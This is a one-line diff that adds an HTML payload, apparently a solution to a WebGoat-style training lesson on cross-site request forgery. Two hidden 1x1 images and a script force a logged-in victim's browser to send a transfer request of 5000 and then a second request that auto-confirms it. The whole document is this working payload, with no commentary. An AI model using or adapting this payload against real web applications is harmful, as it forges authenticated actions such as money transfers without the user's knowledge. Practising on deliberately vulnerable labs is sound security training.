@@ -1,0 +1,1 @@
+<img width='1' and height='1' src='attack?Screen=1232167937&menu=900&transfer=5000' onerror='myFunc()'><img id='secondImg' width='1' and height='1' src=''><script>function myFunc() {document.getElementById("secondImg").src = 'attack?Screen=1232167937&menu=900&transfer=CONFIRMED'}</script>
